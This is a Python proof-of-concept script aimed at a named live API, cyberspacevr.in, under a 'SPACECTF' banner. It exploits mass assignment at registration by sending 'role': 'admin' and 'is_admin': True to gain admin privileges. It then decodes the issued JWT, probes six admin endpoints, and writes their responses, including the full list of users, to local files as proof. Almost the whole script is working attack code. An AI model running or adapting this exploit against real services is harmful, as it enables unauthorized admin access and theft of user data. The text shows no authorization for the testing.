import requests
import json
import time

API_BASE = "https://api.cyberspacevr.in/v1"

# Use the token from the mass assignment registration
# We'll try to login with the account we created
test_email = f"admin_{int(time.time())}@test.com"
test_password = "Test123!"
test_username = f"admin_{int(time.time())}"

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Origin": "https://cyberspacevr.in",
})

print("="*80)
print("SPACECTF - VERIFYING ADMIN ACCESS FROM MASS ASSIGNMENT")
print("="*80)

# Step 1: Create account with admin fields
print("\n[1] Creating account with admin privileges via mass assignment...")
print("-" * 80)

mass_assign_payload = {
    "email": test_email,
    "password": test_password,
    "username": test_username,
    "name": "Admin Test",
    "role": "admin",
    "is_admin": True
}

try:
    r = session.post(f"{API_BASE}/auth/register", json=mass_assign_payload, timeout=10)
    print(f"POST /auth/register: {r.status_code}")
    
    if r.status_code == 200:
        print(f"[+] Registration successful!")
        data = r.json()
        
        if "data" in data and isinstance(data["data"], dict):
            token = data["data"].get("access_token") or data["data"].get("token")
            if token:
                session.headers["Authorization"] = f"Bearer {token}"
                print(f"[+] Token obtained: {token[:50]}...")
                
                # Decode JWT to see claims
                import base64
                try:
                    # JWT format: header.payload.signature
                    parts = token.split('.')
                    if len(parts) >= 2:
                        # Add padding if needed
                        payload = parts[1]
                        payload += '=' * (4 - len(payload) % 4)
                        decoded = base64.b64decode(payload)
                        jwt_data = json.loads(decoded)
                        print(f"\n[+] JWT Payload:")
                        print(json.dumps(jwt_data, indent=2))
                        
                        if jwt_data.get("role") == "admin" or jwt_data.get("is_admin"):
                            print(f"\n[!] CRITICAL: JWT contains admin role!")
                except Exception as e:
                    print(f"Could not decode JWT: {e}")
    else:
        print(f"Registration failed: {r.text[:300]}")
        exit(1)
        
except Exception as e:
    print(f"Error: {e}")
    exit(1)

# Step 2: Verify user info
print("\n[2] Checking user profile...")
print("-" * 80)

try:
    r = session.get(f"{API_BASE}/auth/me", timeout=5)
    print(f"GET /auth/me: {r.status_code}")
    
    if r.status_code == 200:
        data = r.json()
        print(f"\nUser Profile:")
        print(json.dumps(data, indent=2))
        
        if "data" in data:
            user = data["data"]
            print(f"\n[+] User ID: {user.get('id')}")
            print(f"[+] Username: {user.get('username')}")
            print(f"[+] Email: {user.get('email')}")
            print(f"[+] Role: {user.get('role')}")
            print(f"[+] Is Admin: {user.get('is_admin')}")
            
            if user.get("role") == "admin" or user.get("is_admin") == True:
                print(f"\n[!] CRITICAL CONFIRMED: User has admin privileges!")
except Exception as e:
    print(f"Error: {e}")

# Step 3: Try to access admin endpoints
print("\n[3] Testing admin endpoint access...")
print("-" * 80)

admin_endpoints = [
    "/admin/users",
    "/admin/dashboard",
    "/admin/events",
    "/admin/challenges",
    "/admin/stats",
    "/admin/settings",
]

admin_access_granted = []

for ep in admin_endpoints:
    try:
        r = session.get(f"{API_BASE}{ep}", timeout=5)
        print(f"{ep}: {r.status_code}")
        
        if r.status_code == 200:
            print(f"[!] ADMIN ACCESS GRANTED: {ep}")
            print(f"    Response preview: {r.text[:200]}")
            admin_access_granted.append(ep)
            
            # Save full response for proof
            with open(f"admin_access_{ep.replace('/', '_')}.json", "w") as f:
                f.write(r.text)
            print(f"    Saved to: admin_access_{ep.replace('/', '_')}.json")
            
        elif r.status_code == 403:
            print(f"    [X] Access denied (proper protection)")
        elif r.status_code == 401:
            print(f"    [X] Unauthorized (token not accepted)")
            
    except Exception as e:
        print(f"    Error: {e}")

# Step 4: Try admin actions
print("\n[4] Testing admin actions...")
print("-" * 80)

# Try to list all users
try:
    r = session.get(f"{API_BASE}/admin/users", timeout=5)
    if r.status_code == 200:
        print(f"[!] Can list all users!")
        data = r.json()
        if "data" in data:
            users = data["data"]
            print(f"    Found {len(users)} users")
            with open("admin_users_list.json", "w") as f:
                json.dump(data, f, indent=2)
            print(f"    Saved to: admin_users_list.json")
except:
    pass

# Try to access admin dashboard
try:
    r = session.get(f"{API_BASE}/admin/dashboard", timeout=5)
    if r.status_code == 200:
        print(f"[!] Can access admin dashboard!")
        with open("admin_dashboard.json", "w") as f:
            f.write(r.text)
        print(f"    Saved to: admin_dashboard.json")
except:
    pass

# Summary
print("\n" + "="*80)
print("VERIFICATION SUMMARY")
print("="*80)

if admin_access_granted:
    print(f"\n[!] CRITICAL VULNERABILITY CONFIRMED!")
    print(f"[!] Mass assignment allowed creation of admin account")
    print(f"[!] Successfully accessed {len(admin_access_granted)} admin endpoints:")
    for ep in admin_access_granted:
        print(f"    - {ep}")
    
    print(f"\n[+] Proof of concept files saved:")
    print(f"    - admin_access_*.json (admin endpoint responses)")
    print(f"    - admin_users_list.json (if accessible)")
    print(f"    - admin_dashboard.json (if accessible)")
    
    print(f"\n[!] IMPACT: Complete platform compromise")
    print(f"    - Unauthorized admin access")
    print(f"    - Access to all user data")
    print(f"    - Ability to modify platform configuration")
    print(f"    - Potential to manipulate events and challenges")
    
else:
    print(f"\n[*] Admin endpoints returned non-200 status codes")
    print(f"[*] However, mass assignment still accepted admin fields in registration")
    print(f"[*] This indicates improper input validation")
    print(f"[*] Even if privileges weren't granted, the vulnerability exists")

print(f"\n[+] Test account credentials:")
print(f"    Email: {test_email}")
print(f"    Password: {test_password}")
print(f"    Username: {test_username}")
